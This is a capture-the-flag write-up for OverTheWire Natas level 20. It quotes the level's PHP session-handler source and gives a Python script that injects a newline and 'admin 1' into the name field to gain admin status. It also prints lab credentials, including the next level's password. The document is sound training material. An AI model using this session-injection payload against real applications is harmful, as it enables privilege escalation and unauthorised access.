# Level 20

## Challenge Details 

- **CTF:** OverTheWire
- **Category:** Natas

## Provided Materials

- [http://natas20.natas.labs.overthewire.org](http://natas20.natas.labs.overthewire.org)
- username: `natas20`
- password: `guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH`

## Solution

![start](./start.jpg)

Let's view the sourcecode:

```php
...
<?php

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>
...
```

The `debug` function will print debug output, if our `debug` parameter is set to something, for example `www.something.com?debug=true`.

Then we need to understand how the session is created. The function `mywrite` takes out input `data`, that we can send in the `Your name` field and write it to the `"/mysess_{sid}` file, but what we need to understand is that the input is not sanitized! So we can write whatever we want. 

Let's now understand, how will be admin rights checked. The function `myread` reads the `/mysess_{sid}` file *(that was created in `mywrite`)* and populates `$_SESSION` superglobal array based on the file's contents. And the function `print_credentials` checks if `$_SESSION` contains entry `admin:1`. So to get the admin privileges we need somehow send following:

```
whatever
admin 1
```

So on the server it will be interpreted as:

```
name whatever
admin 1
```

And then we need to call the same page without `name` parameter, so it will read the file contents. Let's write python script for this:

```py
import requests
from bs4 import BeautifulSoup

# Base URL
url = 'http://natas20.natas.labs.overthewire.org/'

# Function to make two GET requests (first one to write to the file, second one - to read)
def send_2_get_requests():
    # Cookies dictionary
    cookies = dict()

    # Our parameters (with name set to whatever and debug)
    params = dict(name="whatever\nadmin 1", debug="1")
    
    headers = {
        'Authorization': 'Basic bmF0YXMyMDpndVZhWjNFVDM1TGJnYkZNb2FONXRGY1lUMWpFUDdVSA==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas20.natas.labs.overthewire.org',
        'Referer': 'http://natas20.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }

    # Make the GET request with out params (name and debug)
    response_from_write = requests.get(url, headers=headers, params=params, cookies=cookies)

    # Get the PHPSESSID from the response
    phpsessid = response_from_write.cookies['PHPSESSID']

    # Modify the params to exlude `name` parameter
    params = dict(debug="1")

    # Set the PHPSESSID for the next request
    cookies = dict(PHPSESSID=phpsessid)

    # Send request to the same url with modified parameters and PHPSESSID cookie
    response_from_read = requests.get(url, headers=headers, params=params, cookies=cookies)
    
    # response_from_read.text contains the HTML content
    html_content = response_from_read.text

    # Parse the HTML content
    soup = BeautifulSoup(html_content, 'html.parser')

    # Find the <pre> tag
    pre_tag = soup.find('pre')

    print(pre_tag.get_text())

send_2_get_requests()
```

Output:

```
Username: natas21
Password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
```

## Password

`natas21`:`89OWrTkGmiLZLv12JY4tLj2c4FW0xn56 `

*Created by [bu19akov](https://github.com/bu19akov)*